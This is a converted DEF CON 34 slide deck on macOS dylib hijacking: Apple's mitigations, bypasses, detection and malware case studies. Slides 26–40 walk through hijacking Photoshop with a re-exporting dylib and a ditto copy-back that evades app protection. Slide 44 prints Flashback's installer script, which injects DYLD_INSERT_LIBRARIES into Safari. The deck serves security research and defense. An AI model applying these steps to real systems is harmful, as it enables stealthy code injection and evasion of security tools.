---
title: "Dylib Hijacking on macOS Dead or Alive"
speakers: ["Patrick Wardle"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: 2026
source_pdf: "DEF CON 34/DEF CON 34 - Patrick Wardle - Dylib Hijacking on macOS Dead or Alive - Hijack 2026.pdf"
pages: 64
sha256: "5c1d9444bd6ea365b858dc79548c4b5b73f4232c92220cab68a8ec73627ab1a5"
text_chars: 32442
ocr_pages: 3
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.6
ocr_unreliable_blocks: 0
vision_unreviewed_pages: 0
vision_verified_pages_changed: 45
vision_verified_pages: 64
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:42:28Z"
---
# Dylib Hijacking on macOS Dead or Alive

**Speakers:** Patrick Wardle  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Patrick Wardle - Dylib Hijacking on macOS Dead or Alive - Hijack 2026.pdf` (64 pages)


## Slide 1

# **`Dead or Alive?`** dylib hijacking on macOS

+ "bad" dylibs & their detection !

## Slide 2

### **`% WHOAMI`**

##### **`Patrick Wardle`**

\```
Objective-See
\```

Building core macOS detection components that integrate into larger enterprise security products

\```
DoubleYou
\```

\```
"Art of Mac Malware"
(book series)
\```

## Slide 3

### **`WHAT YOU WILL LEARN`**

\```
Today, we'll explore "dylib hijacking" and the
mitigations Apple has introduced to comprehensively(?) thwart it.
More broadly, we'll look at (malicious) dylibs and their detections.
/* Definitions */
\```

\```
Library:
Compiled reusable code that programs load at
runtime to provide shared functionality.
Dependency:
A library a program relies (depends) on to run.
\```

**`Loader: A program that loads an executable into memory, prepares it to run, and transfers control to it.`** On macOS, libraries are referred to as " **`dylibs`** ", ...while the loader is named **`dyld`**

## Slide 4

## A brief **`Introduction & Concepts`**

## Slide 5

### **`Processes ...as trusted entities`**

each process runs its own (protected) memory space

\```
A process
(and its libraries)
\```

\```
"Process-level"
 (macOS security) decisions:
Entitlements
(e.g. override SIP)
Endpoint Security events
("responsible process")
\```

\```
Resource access
(e.g. TCC access checks)
\```

\```
3rd-party security tools
(e.g. firewalls, app auth.)
\```

\```
Security decisions are made at the process level
...and any libraries within it, are included in this!
\```

## Slide 6

### **`Processes Injection insert (malicious) code into a process`**

If a malicious library is loaded into a trusted process, they inherit its privileges and it becomes part of all process-level security decisions! **`+`** macOS / 3rd-party security tools traditionally blind to loaded libraries **`One way to load malicious dylibs into trusted processes is (was?) via "dylib hijacking"`**

## Slide 7

### **`History of dll/dylib hijacking`**

early 2000s:
Georgi Guninski

2010: HD Moore
public "discovery"

When programs load DLL's, they search a sequence of directories looking for the DLL. It is important that penetrators can't insert a "fake" DLL in one of these directories where the search finds it before a legitimate DLL of the same name. Confusing this issue is that the different methods search different sequences of directories.

1998: NSA
(Window's NT Security guide)

Microsoft Security Advisory 2269637
Insecure Library Loading Could Allow Remote Code Execution
Published: August 23, 2010 | Updated: May 13, 2014

2015: P. Wardle
public "discovery"

Apple's Mitigations

RIP dylib hijacks?

## Slide 8

\```
How are processes launched?
...by the loader!
\```

On disk binary !=
In memory binary

##### **`program on disk`**

##### **`loader (dyld)`**

\```
program
(+dependencies in memory)
\```

\```
When a program is launched, dyld loads it into memory,
resolves dependencies, and then hands off execution.
\```

## Slide 9

### **`How are dependencies specified? by load commands, specifically via the LC_LOAD_DYLIB`**

\```
% otool -L /System/Applications/Calculator.app/Contents/MacOS/Calculator
/usr/lib/libobjc.A.dylib
/usr/lib/libSystem.B.dylib
/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
/System/Library/PrivateFrameworks/Calculate.framework/Versions/A/Calculate
/System/Library/PrivateFrameworks/CalculateUI.framework/Versions/A/CalculateUI
....
\```

\```
% otool -l /System/Applications/Calculator.app/Contents/MacOS/Calculator
...
Load command 17
          cmd LC_LOAD_DYLIB
      cmdsize 56
         name /usr/lib/libobjc.A.dylib (offset 24)
compatibility version 1.0.0
\```

each dependency described via a
'LC_LOAD_DYLIB' load command

malware analysis: insight into capabilities **`wifi scans webcam access monitoring for usbs`**

\```
% otool -L Malware/Mokes/A/Mokes
...
/System/Library/Frameworks/CoreWLAN.framework/Versions/A/CoreWLAN
/System/Library/Frameworks/AVFoundation.framework/Versions/A/AVFoundation
/System/Library/Frameworks/DiskArbitration.framework/Versions/A/DiskArbitration
\```

OSX.Mokes
dependencies

## Slide 10

**`An observation ...about non-absolute dependencies`** if a program specifies a ("non-weak") dependency  and its not found at load time, the program won't run! **`Programs have dependencies that, so far, we’ve seen are defined using absolute paths. However, absolute paths don't work well for internal dependencies (like those inside an app bundle) if the binary is moved.`**

% tree "Foo.app"
Foo.app
       └── Contents
           ├── Frameworks
           │   ├── bar.dylib
           ├── MacOS
           │   ├── Foo

"...[you] want your binaries to be installable in anywhere on the disk" -Apple

\```
an app, with an
"internal" dependency
\```

## Slide 11

### **`Run Path Dependencies (prefix: "@rpath") resolved based on the program's runtime location`**

**`% otool -l Foo.App/Contents/MacOS/Foo`** "run path" dependency **`Load command 14 cmd LC_LOAD_DYLIB cmdsize 56 name @rpath/foo.dylib Load command 104 cmd LC_RPATH cmdsize 32`** "run path" dirs. **`path @executable_path Load command 105 cmd LC_RPATH cmdsize 32 path @loader_path Load command 106 cmd LC_RPATH cmdsize 48 path @executable_path/../Frameworks`**

\```
@rpath/foo.dylib
\```

looks for the "rpath" dependency ...in each "rpath" directory (each specified in a **`LC_RPATH`** )

% man dyld **`"@rpaths"`**

**`The loader searches each run path (LC_RPATH) directory and blindly`** 👀 **`loads the first dylib it finds that matches the dependency's name`**

## Slide 12

### **`So what is library hijacking?`**

note: not all binaries are "vulnerable" **`Imagine a binary with:`** ...also, this isn't the binary's fault per se!

**`Multiple run path directories, The dependency is found in a secondary run path dir.`** Drop a library, with the same name, in a primary search location ...hijack! (no need to modify the binary)

foo.dylib?
foo.dylib?

## Slide 13

### **`Impact? (circa 2015) persistence, code injection, gatekeeper bypasses, & more!`**

hijackable apps on my box

| Apple | Microsoft | Others |
| --- | --- | --- |
| iCloud Photos | Word | Google(drive) |
| Xcode | Excel | Adobe (plugins) |
| iMovie (plugins) | Powerpoint | GPG Tools |
| Quicktime (plugins) | Upload Center | DropBox |

###### **`in everything was hijackable!`**

\```
Xcode: hijacked dylib loaded in /Applications/Xcode.app/Contents/MacOS/Xcode (65204
\```

code injection into Xcode
(do you trust your compiler?)

\```
$ reboot
$ lsof -p <pid of PhotoStreamAgent>
/Applications/iPhoto.app/Contents/Library/LoginItems/
PhotoFoundation.framework/Versions/A/PhotoFoundation

/Applications/iPhoto.app/Contents/Frameworks/
PhotoFoundation.framework/Versions/A/PhotoFoundation
\```

stealthy persistence
(via Apple's PhotoStreamAgent)

\```
Applications
    Instruments.app
Developer
OtherFrameworks
SharedFrameworks
    CoreProfileDT.framework
    CoreSimulator.framework
        Versions
            A
                CoreSimulator
\```

Gatekeeper bypass via
'externally' referenced dylibs

## Slide 14

### **`Always an Impact? only if vulnerable app is "useful"`**

Cyber Security News

DLL hijacking test

DLL hijacking test

确定

Notepad++ DLL Hijacking Vulnerability
Let Attackers Execute Malicious Code

A newly discovered DLL hijacking vulnerability in Notepad++, the popular source code editor, could allow attackers to execute arbitrary code on a victim's machine. Tracked as CVE-2025-56383, the flaw exists in version 8.8.3 and potentially affects all installed versions of the software, putting millions of users at risk. The vulnerability enables a local attacker to achieve code execution by planting a malicious DLL file in a location where the application will load it.

7:59 AM · Sep 29, 2025 · 143.2K Views

infosec twitter (x)
...remains undefeated

CVE-2025-56383 (Sept. 2025)
"millions of [Windows] users at risk"

**`Ok, but really this only allows local attackers to load a library in Notepad++`** 🤪

## Slide 15

## Apple's **`Mitigations`**

## Slide 16

\```
"Remote" Mitigation ("quick fix")
patch for CVE 2015-3715 (external dylibs)
\```

GATEKEEPER BYPASS 0x1 (CVE 2015-3715)
(dylib) hijacking external content

wasn't verified!

verified, so can't modify

<external>.dylib

(signed) application

gatekeeper only verified the app bundle!

.dmg/.zip layout

###### **`external dylib hijack`**

\```
$ classdump XprotectFramework
@interface XprotectDylibCheck : NSObject {
    NSMutableArray *_rPaths;
    NSMutableArray *_loadCommands;
    ....
}
+ (BOOL)path:(id)arg1 isSafeWithBundle:(id)arg2;
+ (id)allowedLibraryPaths;
- (BOOL)checkCommandsWithBundleURL:(id)arg1;
\```

checks each dependency (e.g. **`LC_LOAD_DYLIB`** )

\```
01 if (![self path:dylib isSafeWithBundle:bundle]) {
02 //NOT SAFE: block/log "Fails dylib check"
03 }
\```

\```
(lldb) po $rax
<__NSArrayI 0x7f89ca4ed960>(
/usr/, /opt, /System/, /Library/,
/Network/, /AppleInternal/, /Developer, /build
)
\```

\```
dylib in "allowed" dirs?
\```

\```
01 if(YES != [dylib hasPrefix:appBundle]) {
02 //NOT SAFE
03 }
\```

\```
dylib is in app bundle?
\```

## Slide 17

### **`"Remote" Mitigations (more generally) gatekeeper path randomization, a.k.a. 'translocation'`**

Repackaging Problem

App

Malicious Content

**`"`** **_`What's New in Security`_** **`" (WWDC 2016)`**

* Any references to (untrusted) external content are therefore severed * 💥

disk image, zip, etc.

only bundle is copied ...then exec'd

**`bundle with external (hijackable?) content`**

\```
isolated app
(no external content)
\```

## Slide 18

### **`"Remote" Mitigations gatekeeper path randomization a.k.a. translocation`**

\```
# ./processMonitor
{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
      "pid" : 4112
      "name" : "Adobe Photoshop 2026",
      "path" : "/private/var/folders/tp/j1m5l84j72d4qdmqhbyr6j3c0000gn/T/AppTranslocation/
                A73C93FD-0166-44D7-9A3A-C0DC91300BB3/d/Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026",
      ...
  }
}

% ps 4112
PID   COMMAND
4112  /private/var/folders/tp/j1m5l84j72d4qdmqhbyr6j3c0000gn/T/AppTranslocation/
      A73C93FD-0166-44D7-9A3A-C0DC91300BB3/d/Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026
\```

app executed from a translocated path
.../AppTranslocation/...

Learn more: "'Untranslocating' an App" objective-see.org/blog/blog_0x15.html

\```
"App Translocation" folders:
\```

\```
Are read-only
Are randomly named
Contain only the app bundle (nothing external!)
\```

## Slide 19

### **`"Remote" Mitigations (more generally) notarization`**

downloaded code, must be notarized!

###### **`developers must submit binaries for notarization prior to distribution`**

Not Opened

Apple could not verify is free of malware that may harm your Mac or compromise your privacy.

Done

Move to Trash

\```
notarization check
\```

macOS will not load a hijacker dylib, even if it's "distributed" with a trusted app.

## Slide 20

### **`Local Mitigations "library validation" via the Hardened Runtime`**

SUGGESTIONS FOR APPLE
perhaps how to harden os x/macOS

prevent dylib proxying?

\```
$ codesign -dvv /Install OS X El Capitan.app
Identifier=com.apple.InstallAssistant.ElCapitan
Authority=Software Signing
Authority=Apple Code Signing Certification Authority
Authority=Apple Root CA
TeamIdentifier=not set
\```

dumping 'Team ID'

a suggestion (2016)

Discussion

The Hardened Runtime enables library validation by default. This security-hardening feature prevents a program from loading frameworks, plug-ins, or libraries unless they're either signed by Apple or signed with the same Team ID as the main executable. The macOS dynamic linker (dyld) provides a detailed error message when the system prevents code from loading due to library validation.

in 2018 Apple listens!? 🤯

even if a app is vulnerable to a dylib hijack macOS will no longer load the hijacker's dylib!

**`Library Validation, all loaded dylibs must be: Signed with app's team ID`** or **`Signed by Apple (e.g. system library)`**

## Slide 21

### **`Local Mitigations TCC/Gatekeeper improvements`**

Location attribution

Gatekeeper improvements

Launching Mac apps at login

\```
"What's New in Privacy"
(WWDC 2022)
\```

local attacker ...attempting app subversion (hijack?)

would like to access data from other apps.

Keeping app data separate makes it easier to manage your privacy and security.

Don't Allow

Allow

**`vulnerable app`** so now, even privileged (local) attackers cannot modify app bundles! **`"`** **_`Gatekeeper will validate the integrity of all notarized apps on first launch ...additionally, Gatekeeper will attempt to block unauthorized tampering attempts alerting the user`_** **`" -Brandon Dalton`**

## Slide 22

\```
Conclusions
\```

## Slide 23

### **`TAKEAWAYS`**

"dylib hijacking" on macOS <u>was</u> a massive security issue !

But Apple responded ...quickly & resoundingly :

\```
Notarization
Translocation
Library Validation
App Protection (TCC/GK checks)
\```

...RIP dylib hijacking

## Slide 24

...but is it really dead ?

## Slide 25

Dylib Hijacking **`Today (macOS 26)`**

## Slide 26

### **`Bypassing Translocation ...by symlinking to the application's binary`**

not translocated !

\```
"event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
"process" : {
  "signing info (computed)" : {
    "teamID" : "JQ525L2MZD",
    "signatureID" : "com.adobe.Photoshop",
    "signatureStatus" : 0,
    "signatureSigner" : "Developer ID",
    "signatureAuthorities" : [
      "Developer ID Application: Adobe Inc. (JQ525L2MZD)",
      "Developer ID Certification Authority",
      "Apple Root CA"
    ]
  },
  "uid" : 501,
  "arguments" : [
    "/Volumes/Adobe Photoshop 2025/Adobe Photoshop 2025/Adobe Photoshop 2025.app/Contents/MacOS/Adobe Photoshop 2025"
  ],
  "ppid" : 3433,
  "ancestors" : [
    438,
    1
\```

app is *not* translocated

disk image
symlink + hidden bundle + external (?)

\```
If the user clicks the app, it gets translocated prior to launch
...but if the user clicks a symlink to the app's binary, it's not!?
\```

## Slide 27

### **`"Remotely" Exploiting? "relative" external components still viable`**

**`Create benign app with (reflective) "updater" dylib`**

**`Submit for notarization`** 🤞

externally hijackable + w/ no library validation!

**`Package up "updater" with an "externally" vulnerable but legitimate (trusted/notarized) app`**

Anything that loads or runs external content (normally blocked by app translocation) is now fair game!

For example: create an app that executes commands from a config file in its working directory,

...omit the file when notarizing, include it later during deployment!

$5 million. We're also doubling or significantly increasing rewards in many other categories to encourage more intensive research. This includes $100,000 for a complete Gatekeeper bypass, and $1 million for broad unauthorized iCloud access, as no successful exploit has been demonstrated to date in either

## Slide 28

### **`Local Hijacks ...first, how to find "vulnerable" apps`**

**`% otool -l <some binary> ...`** "run path" dependency **`Load command 14 cmd LC_LOAD_DYLIB cmdsize 56 name @rpath/<some>.dylib Load command 104`** multiple **`cmd LC_RPATH cmdsize 32`** "run paths" **`path @executable_path Load command 105 cmd LC_RPATH cmdsize 32 path @loader_path Load command 106 cmd LC_RPATH cmdsize 48 path @executable_path/../Frameworks`**

is vulnerable? hijack, by planting dylib in primary directory!

\```
Is 3rd-party program
Has 'rpath' dependency
Has multiple LC_RPATH dirs.
Dependency found in secondary dir.
No hardened runtime
(or 'library validation' disabled)
\```

\```
Recall that, the loader searches each run path (LC_RPATH) directory
and loads the first dylib it finds that matches the dependency's name!
\```

## Slide 29

### **`Local Hijacks via Objective-See's "Dylib Hijack Scanner"`**

Dylib Hijack Scanner

Dylib Hijack Scanner or DHS, is a simple utility that will scan your computer for applications that are either susceptible to dylib hijacking or have been hijacked.

download

\```
01 //scan all LC_LOAD_DYLIBS
02 for(NSString* loadDylib in binary.parserInstance.binaryInfo[KEY_LC_LOAD_DYLIBS]) {
03
04    //skip dylibs that are imported normally (e.g. without '@rpath')
05    if(YES != [loadDylib hasPrefix:RUN_SEARCH_PATH]) {
06       continue;
07    }
08
09    //grab first run path directory
10    firstRPathDirectory = [binary.parserInstance.binaryInfo[KEY_LC_RPATHS] firstObject];
11
12    //"resolve" dylib path using run path
13    absoluteDylib = [firstRPathDirectory stringByAppendingPathComponent:
14                    [loadDylib substringFromIndex:"@rpath".length]];
15
16        //is candidate
17        // not found, not in dyld cache, not SIP'd etc
18        if(YES == [self isCandidate:absoluteDylib]) {
19            //"VULNERABILITY" DETECTED!
20            // dylib isn't found in first run-path search directory!
21        }
22    ...
\```

vulnerable application detection

## Slide 30

### **`Hijacking Photoshop (libtbb.12.6.dylib) ...to craft a stealthy 'trusted' implant!`**

\```
% otool -l
 "Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026"
...
Load command 14
          cmd LC_LOAD_DYLIB
      cmdsize 56
         name @rpath/libtbb.12.6.dylib
Load command 104
          cmd LC_RPATH
      cmdsize 32
         path @executable_path
...
Load command 106
          cmd LC_RPATH
      cmdsize 48
         path @executable_path/../Frameworks
\```

a "run-path" dependency

multiple "run-paths"

Disabled lib. validation

\```
{
    "com.apple.security.application-groups" =     (
        "JQ525L2MZD.com.adobe.NGL"
    );
    "com.apple.security.automation.apple-events" = 1;
    "com.apple.security.cs.allow-dyld-environment-variables" = 1;
    "com.apple.security.cs.allow-jit" = 1;
    "com.apple.security.cs.allow-unsigned-executable-memory" = 1;
    "com.apple.security.cs.disable-library-validation" = 1;
    "com.apple.security.personal-information.addressbook" = 1;
    "com.apple.security.personal-information.calendars" = 1;
    "com.apple.security.personal-information.photos-library" = 1;
}
\```

malicious
libtbb.12.6.dylib
Contents/MacOS

legit
libtbb.12.6.dylib
Frameworks/

\```
Since the libtbb.12.6.dylib exists in a secondary location
and Photoshop has disabled library validation, can we hijack it!?
\```

## Slide 31

### **`Crafting a Compatible Hijacker version # must match, and exports must be taken care of!`**

% open "Adobe Photoshop 2026.app"
dyld: Library not loaded: @rpath/libtbb.12.6.dylib
Referenced from: "Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026”
Reason: Incompatible library version:
Adobe Photoshop 2026.app requires version 1.0.0 or later, but libtbb.12.6.dylib provides version 0.0.0
Trace/BPT trap: 5
% open "Adobe Photoshop 2026.app”
dyld: Symbol not found: '_TBB_runtime_version'
Referenced from: "Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026"
Expected in: "Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026/libtbb.12.6.dylib”
Trace/BPT trap: 5

\```
The hijacker library must match in name, version, but also provide
the expected exports, otherwise the loader with throw an exception
\```

## Slide 32

### **`Crafting a Compatible Hijacker re-exporting exports to original library dylib`**

\```
% dyld_info -exports "Adobe Photoshop 2026.app/Contents/Frameworks/libtbb.12.6.dylib” | c++filt
offset      symbol
0x00018234  _TBB_runtime_interface_version
0x0001823F  _TBB_runtime_version
0x00013360  tbb::detail::r1::deallocate(tbb::detail::d1::small_object_pool&, void*, unsigned long)
0x0000402C  tbb::detail::r1::initialize(tbb::detail::d1::task_arena_base&)
0x0001801A  tbb::detail::r1::initialize(tbb::detail::d1::task_group_context&)
0x000125EE  tbb::detail::r1::try_acquire(tbb::detail::d1::queuing_rw_mutex&, tbb::detail::d1::queuing_rw_mutex::scoped_lock&, bool)
0x00012DE7  tbb::detail::r1::try_acquire(tbb::detail::d1::rtm_mutex&, tbb::detail::d1::rtm_mutex::scoped_lock&)
0x000122FE  tbb::detail::r1::itt_task_end(tbb::detail::d1::itt_domain_enum)
0x00012F1F  tbb::detail::r1::acquire_reader(tbb::detail::d1::rtm_rw_mutex&, tbb::detail::d1::rtm_rw_mutex::scoped_lock&, bool)
\```

###### **`(legitimate) libtbb.12.6.dylib's exports`**

"re-export"

hijacker

orignal

\```
At compile time:
-Xlinker
-reexport_library <original dylib>
\```

\```
install_name_tool -change to set
absolute path
\```

## Slide 33

### **`Crafting a Compatible Hijacker re-exporting exports to original library dylib`**

\```
% tree "Adobe Photoshop 2026.app"
Adobe Photoshop 2026.app
       └── Contents
           ├── Frameworks
           │   ...
           │   ├── libtbb.12.6.dylib
           ├── Info.plist
           ├── MacOS
           │   ├── Adobe Photoshop 2026
           │   ├── libtbb.12.6.dylib
\```

original: Contents/Frameworks/libtbb.12.6.dylib

hijacker: Contents/MacOS/libtbb.12.6.dylib

###### **`Photoshop hijacked?`**

\```
% otool -l "Adobe Photoshop 2026.app/Contents/MacOS/libtbb.12.6.dylib”
...
Load command 11
          cmd LC_REEXPORT_DYLIB
      cmdsize 128
         name /Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/Frameworks/libtbb.12.6.dylib
\```

Photoshop

MacOS/libtbb.12.6.dylib

"re-export"

Frameworks/libtbb.12.6.dylib

## Slide 34

### **`Bypassing "App Protection" ? as macOS protects apps & re-validates on (re)launch`**

\```
% sudo cp libtbb.12.6.dylib "/Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/MacOS/
cp: /Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/MacOS/libtbb.12.6.dylib: Operation not permitted
\```

**`(even as root) cannot modify application directly`**

"safe" to replace apps as they contain no (user) data!

**`Copy via ditto Add hijacker dylib Copy back via ditto`**

**`/Applications /tmp`**

Verifying "Adobe Photoshop 2025"...

\```
 ...but on launch, will (re)trigger a verification
\```

## Slide 35

\```
patrick@Patricks-MacBook-Air-2 DylibHijack % sudo ditto /tmp/Adobe\ Photoshop\ 2025.app /Applications/Adobe\ Photoshop\ 2025/Adobe\ Photoshop\ 2025.app
patrick@Patricks-MacBook-Air-2 DylibHijack % less ~/Documents/secret.txt
\```

## Slide 36

Verifying "Adobe Photoshop 2025"...

was this vibe-coded?

## Slide 37

### **`Benefits of our Hijack stealthy "persistence" with a high level of inherited trust`**

loaded hijacker dylib

\```
% "/Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026"

[+] Injected fake libtbb.12.6.dylib loaded by:
/Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026
\```

Adobe Photoshop

Artwork by Guillermo Flores Pacheco

© 1990-2025 Adobe. All rights reserved.
For more details and legal notices, go to the About Photoshop screen.

Reading preferences...

Russell Preston Brown, Steve Snyder, Yukie Takahashi, Sarah Kong, David Howe, John Peterson, Kellisa Sandoval, Jonathan Lo, Adam Jerugim, Tom Attix, Yuko Kagita, Meredith Payne-Stotzner, Vinod Balakrishnan, Tai Luxon, Dave Dobish, Melissa Monroe, Chad Rolfs, Steve Guilhamet, Maria Yap, John Fitzgerald, Pam Clark, Foster Brereton, Daniel Presedo, David Hackel, Kevin Hopps, Pete Falco, Jesper Storm Bache, Aryan GD Singh, I-Ming Pao, Gaurishankar Kshirsagar, Ashish Anand, Norman Lei, Izzy Muerte, Michael Taylor, Prabal Kumar Ghosh

no impact to functionality

**`Access to files (TCC bypass):`**

Files & Folders
Allow the applications below to access files and folders.
Adobe Lightroom Classic
Adobe Photoshop 2025
Desktop Folder
Documents Folder
Downloads Folder

**`Access to network (LuLu):`**

LuLu Rules
Current Profile: Default
All Rules
Photoshop
All Rules
Rule
Photoshop 2025
com.adobe.Photoshop (signer: Developer ID Application: Adobe Inc. (JQ525L2MZD))
any address:any port
Allow

## Slide 38

### **`Security Tools? dylib hijack vs. LuLu (firewall)`**

LuLu Rules
Current Profile: Default
All Rules
Photoshop
All Rules
Rule
Photoshop 2025
com.adobe.Photoshop (signer: Developer ID Application: Adobe Inc. (JQ525L2MZD))
any address:any port
Allow

a LuLu rule: allow photoshop

via **`SecCodeCopySigningInformation`** (audit token -> dynamic code ref) + verified with **`SecCodeCheckValidity`**

\```
01 //matched rule
02 // make sure code signing info (still) matches!
03 if(YES != matchesCSInfo(process.csInfo, csInfo)) {
04    os_log_error(logHandle, "ERROR: code signing mismatch:
05                %{public}@ / %{public}@", process.csInfo, csInfo);
06    goto bail;
07 }
\```

\```
01 BOOL matchesCSInfo(NSDictionary* csInfo_1, NSDictionary* csInfo_2) {
02    //first check status (e.g. ensure we're still validly signed)!
03    //then check signer and code signing ID and signing authorities
04 }
\```

LuLu's code signing checks

**`Apple's Runtime code signing APIs are limited to the main process`** 🤷

## Slide 39

### **`Security Tools? dylib hijack vs. Endpoint Security`**

Granularity: "responsible process" process level (including code signing information)

\```
# eslogger open
{
   "event": {
      "open": {
         "file": {
            "path": "\/Users\/patrick\/Documents\/secret.txt"
      }
   },
   "process": {
      "executable": {
         "path": "\/Applications\/Adobe Photoshop 2026\/Adobe Photoshop 2026.app\/Contents\/MacOS\/Adobe Photoshop 2026”,
         "team_id": "JQ525L2MZD",
         "signing_id": "com.adobe.Photoshop"
         ...
    },
    ...
}
\```

\```
file access (ES_EVENT_TYPE_AUTH_OPEN)
responsible process: Photoshop
\```

## Slide 40

### **`Security Tools? dylib hijack vs. Santa`**

**`(before hijacking) create Santa rule to allow Photoshop (e.g. via teamID)`**

\```
# santactl fileinfo "/Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app"
Path        : /Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026
...
Team ID     : JQ525L2MZD

# sudo santactl rule --allow --teamid --identifier JQ525L2MZD
Added rule for Team ID: JQ525L2MZD.
\```

###### **`dylib hijack app`**

###### **`Subsequent app launches are allowed, even though app is subverted!`**

\```
# tail -f /var/db/santa/santa.log

santad: action=EXEC|decision=ALLOW|reason=TEAMID|sha256=c74fee63c5cd642bc90f52366992747effa9f797a1785cbe07578cffa65e3c31|
cert_sha256=9ff4333283ec0a959965925f1ea235a6fe438ded8feab28d238d8a564195a0a4|cert_cn=Developer ID Application: Adobe Inc.
(JQ525L2MZD)|teamid=JQ525L2MZD|pid=22808|pidversion=60782|ppid=1|uid=501|user=patrick|gid=20|group=staff|mode=M|path=/
Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026|args=/Applications/Adobe
Photoshop 2026/Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026
\```

## Slide 41

## Other **`Malicious Dylibs`**

## Slide 42

### **`Observations`**

Security decisions are made <u>at the process level</u>
...and any libraries within it, are included in this.

System tools and APIs provide limited visibility into
a process's loaded libraries.

Activity Monitor
All Processes

Photoshop

| Process Name | % CPU | Kind | PID | User |
| --- | --- | --- | --- | --- |
| Adobe Photoshop 2026 | 1.3 | Apple | 22470 | patrick |
| AutoFill (Adobe Photoshop 2026) | 0.0 | Apple | 22508 | patrick |
| Adobe Photoshop 2026 Graphics and Media | 0.0 | Apple | 22499 | patrick |
| QuickLookUIService (Open and Save Panel Service (Adobe... | 0.0 | Apple | 22669 | patrick |
| Adobe Photoshop 2026 Networking | 0.0 | Apple | 22500 | patrick |
| Open and Save Panel Service (Adobe Photoshop 2026) | 0.0 | Apple | 22668 | patrick |
| Adobe Photoshop 2026 Web Content | 0.0 | Apple | 22506 | patrick |

System: 8.96%
User: 20.62%
Idle: 70.43%
CPU LOAD
Threads: 4,069
Processes: 720

loaded dylibs not shown :( which affords a <u>high level of stealth</u>

**`Creating`** 🍎 **`-malware? Implement it as a dylib!`**

## Slide 43

### **`"Equation group" 1st-stage OS X implant`**

**`dylib version persisted via DYLD_INSERT_LIBRARIES?`**

\```
01 cmd_exec(char* path) {
03    chmod(path, 0700);
05    pid = fork()
07    //child
08    if(0 == pid) {
09       //unset DYLD_INSERT_LIBRARIES
11       execle(...);
\```

\```
01 memcpy(*(env + envIndex_DYLD * 0x4),
02         "DYLD_INSERT_LIBRARIES", lengthOf_DYLD);
04 *(env + envIndex_DYLD * 0x4) + lengthOf_DYLD) = '=';
05 *(env + envIndex_DYLD * 0x4) + lengthOf_DYLD + 0x1) = '\x00';
\```

**`unset DYLD_INSERT_LIBRARIES variable`**

appears there is an execution/persistence mechanism where
the implant is spawned via **`DYLD_INSERT_LIBRARIES`** ??

## Slide 44

### **`Flashback (first wide-spread Mac malware)`**

**`Persistence + browser "injection" via DYLD_INSERT_LIBRARIES`**

\```
Process 64337 stopped
installer`:
->  0x100001934 <+6452>: movq    %rax, %r13

(lldb) x/s $rax
0x7f8b62808800: "#!/bin/sh\nmv %s %s\nchmod 777 %s\nmv %s %s\nchmod 777 %s\ndefaults write /Applications/Safari.app/Contents/Info
LSEnvironment -dict DYLD_INSERT_LIBRARIES "%s"\nchmod 666 /Applications/Safari.app/Contents/Info.plist\ntouch /Applications/Safari.app"
\```

**`Flashback installer (in debugger)`**

\```
...
<key>LSEnvironment</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/Applications/Safari.app/Contents/Resources/.<name from C&C>.xsl</string>
</dict>
\```

Flashback's dylib

**`Safari.app/Contents/Info.plist (infected)`**

## Slide 45

### **`3CX Supply Chain attack`**

**`malicious code "hidden" in subverted dylib`**

CROWDSTRIKE | BLOG

CrowdStrike Falcon Platform Detects and Prevents Active Intrusion Campaign Targeting 3CXDesktopApp Customers

March 29, 2023   CrowdStrike   Research & Threat Intel

...initial confusion about impact to macOS

"At this time, we cannot confirm that the Mac installer is similarly trojanized. Our ongoing investigation includes additional applications like the Chrome extension that could also be used to stage attacks," SentinelOne said.

\```
3CX Desktop App is validly signed & notarized
(Signer: Apple Dev-ID)

3CX Desktop App
/Volumes/3CXDesktopApp-18.12.416/3CX Desktop App.app

  Item Type: Application
     Hashes: View Hashes
   Entitled: View Entitlements
 Sign Auths: › Developer ID Application: 3CX (33CF4654HL)
             › Developer ID Certification Authority
             › Apple Root CA
\```

**`App was signed & notarized`**

**`...meaning, Apple scanned & "approved" it!`**

## Slide 46

### **`Finding the needle`**

**`...in a ~400mb app bundle haystack`**

\```
% cd /Volumes/3CXDesktopApp-18.12.416/3CX\ Desktop\ App.app

% du -h .
...
381M    /Volumes/3CXDesktopApp-18.12.416/3CX Desktop App.app

% find . -type f | wc -l
113
\```

**`~400 mb app`**

**`w/ 100+ files!`**

\```
% ls Contents/Frameworks/Electron\ Framework.framework/Versions/A/Libraries
libEGL.dylib
libGLESv2.dylib
libffmpeg.dylib
\```

0 / 61

No security vendors and no sandboxes flagged this file as malicious

a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67

libffmpeg.dylib

**`libffmpeg.dylib`**

## Slide 47

### **`libffmpeg.dylib`**

**`...an added constructor (x86_64 only)`**

automatically executed when
the library is loaded (e.g. when the 3CX app is run)

\```
01 Section
02     sectname __mod_init_func
03     segname    __DATA
04       addr 0x0000000000275d90
05       size 0x0000000000000008
06     ...
\```

